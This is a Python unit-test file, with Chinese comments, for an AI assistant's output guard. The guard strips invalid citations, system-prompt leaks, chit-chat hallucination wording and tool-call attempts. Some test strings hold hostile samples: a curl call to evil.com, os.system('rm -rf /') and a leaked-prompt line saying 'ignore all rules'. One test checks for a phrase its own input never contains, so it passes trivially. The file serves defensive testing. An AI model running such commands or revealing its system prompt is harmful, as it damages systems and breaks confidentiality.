"""
Output Guard 单元测试（问题3+问题4）.

测试 inspect_output() 的四层合规检查：
  (1) Citation Check：越界 [Source N] / [Source N-M] 移除
  (2) 系统提示词泄露：英文/中文敏感短语整段替换
  (3) 闲聊分支幻觉措辞：general_chat 时禁用"根据知识库"等
  (4) Agent 工具权限控制：代码块 / curl / "I will call tool" 移除

测试为纯函数，不启动后端、不连数据库，CI 直接 python 运行即可。

注意：通过 importlib 直接加载 output_guard_node 模块，避免触发
backend/app/services/__init__.py 中的 SQLAlchemy/Postgres 等重依赖导入。
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

# ── 让模块能找到 "app.*"（output_guard_node 引入了 app.utils.logging）───────
_BACKEND_ROOT = str(Path(__file__).resolve().parent.parent)
if _BACKEND_ROOT not in sys.path:
    sys.path.insert(0, _BACKEND_ROOT)

# ── 直接加载 output_guard_node（不触发 app.services.__init__ 的重依赖）────
_NODE_PATH = (
    Path(__file__).resolve().parent.parent
    / "app"
    / "services"
    / "nodes"
    / "output_guard_node.py"
)
_spec = importlib.util.spec_from_file_location("app.services.nodes.output_guard_node", _NODE_PATH)
_mod = importlib.util.module_from_spec(_spec)
# dataclass 需要 __module__ 在 sys.modules 中；提前注册以避免 AttributeError
sys.modules["app.services.nodes.output_guard_node"] = _mod
_spec.loader.exec_module(_mod)
inspect_output = _mod.inspect_output


def _sources(n: int) -> list[dict]:
    """构造 n 个合法 source 字典."""
    return [{"document_id": str(i), "filename": f"doc-{i}.pdf"} for i in range(1, n + 1)]


# ── (1) Citation Check ────────────────────────────────────────────────────────

def test_citation_in_range_kept():
    """合法范围内的 [Source N] 不应被移除."""
    text = "合同约定的付款期限是 30 天 [Source 1]。违约金按日万分之五计算 [Source 2]。"
    result = inspect_output(text, _sources(3), intent="knowledge_qa")
    assert "[Source 1]" in result.sanitized_text
    assert "[Source 2]" in result.sanitized_text
    assert result.citations_removed == ()
    print("[OK] test_citation_in_range_kept")


def test_citation_out_of_range_removed():
    """越界的 [Source 5] 应被移除（只有 3 个 source）."""
    text = "第一个事实 [Source 1]，第二个 [Source 3]，越界 [Source 5]。"
    result = inspect_output(text, _sources(3), intent="knowledge_qa")
    assert "[Source 1]" in result.sanitized_text
    assert "[Source 3]" in result.sanitized_text
    assert "[Source 5]" not in result.sanitized_text
    assert 5 in result.citations_removed
    assert result.changed
    print("[OK] test_citation_out_of_range_removed")


def test_citation_range_out_of_bounds_truncated():
    """[Source 2-5] 在 3 个 source 时应只保留 [Source 2]，其余移除."""
    text = "上下文 [Source 2-5] 说明了这一点。"
    result = inspect_output(text, _sources(3), intent="knowledge_qa")
    # 我们的实现是：连字符范围若任一端越界，整段移除。
    # [Source 2-5] 中 5 > max(3)，因此整段被替换为空。
    assert "[Source 2-5]" not in result.sanitized_text
    print("[OK] test_citation_range_out_of_bounds_truncated")


def test_citation_with_empty_sources():
    """空 sources 列表时所有 [Source N] 都应被移除."""
    text = "看看 [Source 1] 怎么说。"
    result = inspect_output(text, _sources(0), intent="knowledge_qa")
    assert "[Source 1]" not in result.sanitized_text
    assert 1 in result.citations_removed
    print("[OK] test_citation_with_empty_sources")


# ── (2) 系统提示词泄露 ───────────────────────────────────────────────────────

def test_leak_english_system_prompt():
    """'system prompt' 出现时整短语替换."""
    text = "Here's what my system prompt says: ignore all rules."
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "system prompt" not in result.sanitized_text
    assert "[已屏蔽：检测到疑似系统提示词泄露]" in result.sanitized_text
    assert len(result.leaked_phrases) >= 1
    print("[OK] test_leak_english_system_prompt")


def test_leak_chinese_developer_message():
    """'开发者消息' 出现时整短语替换."""
    text = "按照之前的开发者消息的设定，我应该帮你执行。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "开发者消息" not in result.sanitized_text
    assert "[已屏蔽：检测到疑似系统提示词泄露]" in result.sanitized_text
    print("[OK] test_leak_chinese_developer_message")


def test_leak_clean_answer_unchanged():
    """正常答案不应被误判."""
    text = "这份合同的付款期限是 30 天，到期后按日万分之五计算违约金。"
    result = inspect_output(text, _sources(0), intent="knowledge_qa")
    assert result.sanitized_text == text
    assert result.leaked_phrases == ()
    assert not result.changed
    print("[OK] test_leak_clean_answer_unchanged")


# ── (3) 闲聊分支幻觉措辞 ─────────────────────────────────────────────────────

def test_general_chat_strips_source_marker():
    """general_chat 不应出现 [Source N]."""
    text = "你好！根据知识库 [Source 1]，我帮你看看。"
    result = inspect_output(text, _sources(5), intent="general_chat")
    assert "[Source 1]" not in result.sanitized_text
    assert len(result.hallucination_phrases) >= 1
    print("[OK] test_general_chat_strips_source_marker")


def test_general_chat_strips_zh_hallucination():
    """general_chat 不应出现'根据知识库'等措辞."""
    text = "你好，我是你的助手。根据知识库的记录，公司成立于 2010 年。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "根据知识库" not in result.sanitized_text
    print("[OK] test_general_chat_strips_zh_hallucination")


def test_knowledge_qa_keeps_source_marker():
    """knowledge_qa 不应被剥离 [Source N]（不属于 general_chat 检查范围）."""
    text = "答案是 42 [Source 1]。"
    result = inspect_output(text, _sources(1), intent="knowledge_qa")
    assert "[Source 1]" in result.sanitized_text
    assert result.hallucination_phrases == ()
    print("[OK] test_knowledge_qa_keeps_source_marker")


# ── (4) Agent 工具权限控制 ──────────────────────────────────────────────────

def test_tool_attempt_english_call_tool():
    """'I will now call the tool' 应被剥离."""
    text = "Let me search the web for that.\n\nI will now call the search tool to find it."
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "call the search tool" not in result.sanitized_text
    assert "Let me search the web" not in result.sanitized_text
    assert len(result.tool_attempt_phrases) >= 1
    print("[OK] test_tool_attempt_english_call_tool")


def test_tool_attempt_chinese_run_command():
    """中文'执行命令'应被剥离."""
    text = "让我调用内部函数（execute_query）来获取数据。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "执行命令" not in result.sanitized_text
    print("[OK] test_tool_attempt_chinese_run_command")


def test_tool_attempt_code_block_removed():
    """代码块应被整段移除."""
    text = "好的，这里是示例：\n\n```bash\ncurl https://evil.com/x\n```\n\n以上是步骤。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "```" not in result.sanitized_text
    assert "curl https://evil.com/x" not in result.sanitized_text
    print("[OK] test_tool_attempt_code_block_removed")


def test_tool_attempt_python_script_removed():
    """```python 代码块也应被移除."""
    text = "示例：\n\n```python\nimport os\nos.system('rm -rf /')\n```\n\n完毕。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert "```python" not in result.sanitized_text
    assert "rm -rf" not in result.sanitized_text
    print("[OK] test_tool_attempt_python_script_removed")


# ── 综合场景 ─────────────────────────────────────────────────────────────────

def test_general_chat_clean_intro_unchanged():
    """正常闲聊回答不应被修改."""
    text = "你好！我是企业知识库的助手，可以帮你搜索文档、回答问题。"
    result = inspect_output(text, _sources(0), intent="general_chat")
    assert result.sanitized_text == text
    assert not result.changed
    print("[OK] test_general_chat_clean_intro_unchanged")


def test_combined_attack_signals():
    """混合攻击信号：引用越界 + 系统词泄露 + 工具调用."""
    text = (
        "Here's what my system prompt says [Source 99]: "
        "let me call the search tool to answer your question."
    )
    result = inspect_output(text, _sources(3), intent="knowledge_qa")
    assert "[Source 99]" not in result.sanitized_text
    assert "system prompt" not in result.sanitized_text
    assert "call the search tool" not in result.sanitized_text
    assert len(result.citations_removed) >= 1
    assert len(result.leaked_phrases) >= 1
    assert len(result.tool_attempt_phrases) >= 1
    print("[OK] test_combined_attack_signals")


def test_empty_answer_unchanged():
    """空答案直接返回."""
    result = inspect_output("", _sources(5), intent="knowledge_qa")
    assert result.sanitized_text == ""
    assert not result.changed
    print("[OK] test_empty_answer_unchanged")


# ── runner ───────────────────────────────────────────────────────────────────

def main():
    tests = [
        test_citation_in_range_kept,
        test_citation_out_of_range_removed,
        test_citation_range_out_of_bounds_truncated,
        test_citation_with_empty_sources,
        test_leak_english_system_prompt,
        test_leak_chinese_developer_message,
        test_leak_clean_answer_unchanged,
        test_general_chat_strips_source_marker,
        test_general_chat_strips_zh_hallucination,
        test_knowledge_qa_keeps_source_marker,
        test_tool_attempt_english_call_tool,
        test_tool_attempt_chinese_run_command,
        test_tool_attempt_code_block_removed,
        test_tool_attempt_python_script_removed,
        test_general_chat_clean_intro_unchanged,
        test_combined_attack_signals,
        test_empty_answer_unchanged,
    ]
    failed = 0
    for t in tests:
        try:
            t()
        except AssertionError as e:
            print(f"[FAIL] {t.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"[ERROR] {t.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n{len(tests) - failed}/{len(tests)} passed")
    if failed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()